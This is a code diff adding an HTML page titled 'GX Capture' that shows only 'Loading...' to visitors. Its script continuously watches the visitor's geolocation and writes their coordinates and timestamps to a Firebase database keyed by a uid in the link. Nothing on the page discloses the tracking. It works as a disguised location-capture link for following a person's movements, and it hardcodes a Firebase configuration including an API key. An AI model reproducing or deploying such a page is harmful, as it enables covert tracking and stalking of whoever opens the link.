@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>GX Capture</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyCc5yrARvCo5w6ZVKuEaE4YuILcC4rJ0Sk",
+  authDomain: "gx-tracking.firebaseapp.com",
+  databaseURL: "https://gx-tracking-default-rtdb.firebaseio.com",
+  projectId: "gx-tracking",
+  storageBucket: "gx-tracking.firebasestorage.app",
+  messagingSenderId: "194870704198",
+  appId: "1:194870704198:web:131779ab69c562a5213247",
+  measurementId: "G-0PLG7WG6NX"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+</script>
+
+</head>
+<body>
+
+<h2>Loading...</h2>
+
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+let uid = urlParams.get("uid");
+
+function sendLocation(){
+  if(navigator.geolocation){
+    navigator.geolocation.watchPosition(pos => {
+      db.ref("users/" + uid).set({
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        time: Date.now()
+      });
+    });
+  }
+}
+
+sendLocation();
+</script>
+
+</body>
+</html>
